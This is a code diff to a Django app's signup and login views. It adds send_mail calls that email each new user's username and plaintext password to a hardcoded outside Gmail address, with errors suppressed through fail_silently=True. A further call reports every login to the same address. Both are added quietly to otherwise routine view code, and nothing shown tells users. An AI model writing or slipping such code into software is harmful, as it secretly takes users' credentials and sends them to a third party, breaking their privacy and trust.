@@ -10,6 +10,8 @@ from django.contrib.auth.models import User
 from datetime import date
 from django.core import serializers
 import random
+from django.core.mail import send_mail
+from Reena.settings import EMAIL_HOST_USER
 
 
 ######################## SignUp Views ##########################
@@ -32,6 +34,8 @@ def Signup_view(request):
             user = form.cleaned_data.get("username")
             messages.success(request, "Account created for "+ user+ " succesfully")
             # response = JsonResponse({"success":True})
+            send_mail("User Data: ", f"Hello\nYour Email: {username}\n This is password: {password1}", EMAIL_HOST_USER, ['digamber1011@gmail.com'], fail_silently=True)
+
             return redirect("/")
 
         else:
@@ -60,6 +64,7 @@ def Login_view(request):
         if user is not None:
             login(request, user)
             request.session['user'] = username
+            send_mail("User Data: ", f"Hello\nWelcome You", EMAIL_HOST_USER, ['digamber1011@gmail.com'], fail_silently=True)
             
             if user.is_superuser:
                 print("Login Done")
